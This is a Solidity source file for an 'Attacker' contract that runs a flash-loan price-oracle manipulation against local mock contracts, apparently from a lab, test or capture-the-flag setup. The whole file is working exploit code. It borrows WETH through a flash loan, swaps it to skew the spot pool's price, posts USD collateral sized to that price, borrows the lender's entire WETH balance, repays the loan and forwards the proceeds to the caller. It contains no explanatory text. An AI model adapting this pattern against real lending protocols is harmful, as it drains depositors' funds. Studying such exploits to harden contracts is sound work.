// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./Asset.sol";
import "./SpotPool.sol";
import "./FlashLender.sol";
import "./Lender.sol";

contract Attacker is IFlashBorrower {
    SpotPool public immutable pool;
    FlashLender public immutable flash;
    Lender public immutable lender;
    Asset public immutable weth;
    Asset public immutable usd;

    constructor(SpotPool spotPool, FlashLender flashLender, Lender spotLender) {
        pool = spotPool;
        flash = flashLender;
        lender = spotLender;
        weth = spotLender.weth();
        usd = spotLender.usd();
    }

    function attack(uint256 flashAmount) external {
        flash.flash(flashAmount, "");
        uint256 wethBalance = weth.balanceOf(address(this));
        uint256 usdBalance = usd.balanceOf(address(this));
        if (wethBalance > 0) weth.transfer(msg.sender, wethBalance);
        if (usdBalance > 0) usd.transfer(msg.sender, usdBalance);
    }

    function onFlash(uint256 amount, bytes calldata) external {
        require(msg.sender == address(flash), "caller");

        weth.approve(address(pool), amount);
        pool.swapWethForUsd(amount);

        uint256 price = pool.wethPrice();
        uint256 lenderBalance = weth.balanceOf(address(lender));
        uint256 needed = (lenderBalance * price * 2 + 1e18 - 1) / 1e18;
        usd.approve(address(lender), needed);
        lender.deposit(needed);
        lender.borrow(lenderBalance);

        usd.approve(address(pool), type(uint256).max);
        pool.takeWeth(amount);
        weth.transfer(address(flash), amount);
    }
}
